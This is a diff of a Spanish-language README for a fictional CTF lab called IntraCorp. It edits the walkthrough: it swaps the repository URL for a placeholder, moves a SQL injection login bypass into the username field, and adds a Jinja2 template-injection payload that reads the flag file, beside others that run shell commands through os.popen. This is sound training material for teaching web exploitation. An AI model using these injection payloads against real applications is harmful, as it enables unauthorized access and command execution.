@@ -45,7 +45,7 @@ Empresa ficticia **IntraCorp** — 4 vectores de ataque reales, dificultad media
 
 ```bash
 # 1. Clonar el repositorio
-git clone https://github.com/R-Galarza/intracorp-ctf.git
+git clone https://github.com/TU_USUARIO/intracorp-ctf.git
 cd intracorp-ctf
 
 # 2. Levantar todos los servicios
@@ -112,8 +112,8 @@ La flag está en la tabla `secrets`. El módulo de búsqueda también tiene una 
 El login bloquea palabras exactas pero no la condición `OR`. Usar:
 
 ```
-Usuario:   cualquier_cosa
-Password:  cn' OR '1'='1
+Usuario:   cn' OR '1'='1
+Password:  cualquier_cosa
 ```
 
 Esto genera la query:
@@ -356,7 +356,13 @@ El filtro bloquea `os` literal. Bypass con comillas que separan la cadena:
 {{ self.__init__.__globals__.__builtins__.__import__("os").popen('cat /home/app/flag.txt').read() }}
 ```
 
-**Método C — `lipsum` globals**
+**Método C — `cycler` globals (sin import)**
+```
+{{ cycler.__init__.__globals__.open('/home/app/flag.txt').read() }}
+```
+Este método ni siquiera necesita importar `os`. Usa el built-in `open()` directamente a través de los globals de Jinja2.
+
+**Método D — `lipsum` globals**
 ```
 {{ lipsum.__globals__['__builtins__']['open']('/home/app/flag.txt').read() }}
 ```
